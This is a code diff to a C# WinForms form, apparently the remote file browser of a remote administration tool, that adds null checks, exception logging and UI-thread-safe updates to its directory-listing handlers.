@@ -394,43 +394,46 @@ namespace Pulsar.Server.Forms
         /// </summary>
         private void DirectoryChanged(object sender, string remotePath, FileSystemEntry[] items)
         {
-            // Protect against nulls (your crash source)
-            if (string.IsNullOrWhiteSpace(remotePath))
-                return;
-
-            if (items == null)
-                items = Array.Empty<FileSystemEntry>();
-
-            // Update current path
-            _currentDir = remotePath;
-
-            // Update textbox safely
-            if (txtPath.InvokeRequired)
-            {
-                txtPath.Invoke(new Action(() => txtPath.Text = remotePath));
-            }
-            else
-            {
-                txtPath.Text = remotePath;
-            }
-
-            // Sanitize + sort
             try
             {
+                // -------------------------------
+                // 1. HARD NULL PROTECTION
+                // -------------------------------
+                if (string.IsNullOrWhiteSpace(remotePath))
+                    return;
+
+                if (items == null)
+                    items = Array.Empty<FileSystemEntry>();
+
+                // -------------------------------
+                // 2. UPDATE INTERNAL CURRENT DIR
+                // -------------------------------
+                _currentDir = remotePath;
+
+                // -------------------------------
+                // 3. SAFE UI UPDATE FOR PATH TEXTBOX
+                // -------------------------------
+                if (txtPath.InvokeRequired)
+                {
+                    txtPath.Invoke(new Action(() => txtPath.Text = remotePath));
+                }
+                else
+                {
+                    txtPath.Text = remotePath;
+                }
+
+                // -------------------------------
+                // 4. CLEAN / SORT ITEMS
+                // -------------------------------
                 _cachedItems = items
                     .Where(i => i != null && !string.IsNullOrWhiteSpace(i.Name))
-                    .OrderBy(e => e.EntryType != FileType.Directory)
-                    .ThenBy(e => e.Name, StringComparer.OrdinalIgnoreCase)
+                    .OrderBy(e => e.EntryType != FileType.Directory)           // Folders first
+                    .ThenBy(e => e.Name, StringComparer.OrdinalIgnoreCase)     // A-Z
                     .ToArray();
-            }
-            catch
-            {
-                _cachedItems = Array.Empty<FileSystemEntry>();
-            }
 
-            // Update the ListView
-            try
-            {
+                // -------------------------------
+                // 5. SAFE LISTVIEW UPDATE
+                // -------------------------------
                 if (lstDirectory.InvokeRequired)
                 {
                     lstDirectory.Invoke(new Action(UpdateList));
@@ -440,23 +443,45 @@ namespace Pulsar.Server.Forms
                     UpdateList();
                 }
             }
-            catch { }
+            catch (Exception ex)
+            {
+                // Never allow DirectoryChanged to kill UI thread
+                Debug.WriteLine($"[DirectoryChanged] ERROR: {ex}");
+            }
 
-            SetStatusMessage(this, "Ready");
+            // -------------------------------
+            // 6. STATUS MESSAGE (SAFE)
+            // -------------------------------
+            try
+            {
+                SetStatusMessage(this, "Ready");
+            }
+            catch { }
         }
 
         private void UpdateList()
         {
-            using (new RedrawScope(lstDirectory))
+            try
             {
-                lstDirectory.BeginUpdate();
-                lstDirectory.VirtualListSize = _cachedItems.Length + 1; // +1 for ".."
-                ForceListViewViewportReset();
-                lstDirectory.EndUpdate();
-            }
+                using (new RedrawScope(lstDirectory))
+                {
+                    lstDirectory.BeginUpdate();
 
-            FixListViewLayout();
+                    // +1 for ".." parent folder
+                    lstDirectory.VirtualListSize = _cachedItems.Length + 1;
+
+                    ForceListViewViewportReset();
+                    lstDirectory.EndUpdate();
+                }
+
+                FixListViewLayout();
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"[UpdateList] ERROR: {ex}");
+            }
         }
+
 
         /// <summary>
         /// Provides virtual items to the ListView on demand.
@@ -1415,6 +1440,7 @@ namespace Pulsar.Server.Forms
                 {
                     ShowDocumentPreview(filePath, ext);
                 }
+
                 else
                 {
                     MessageBox.Show("Unsupported file type.", "Preview",
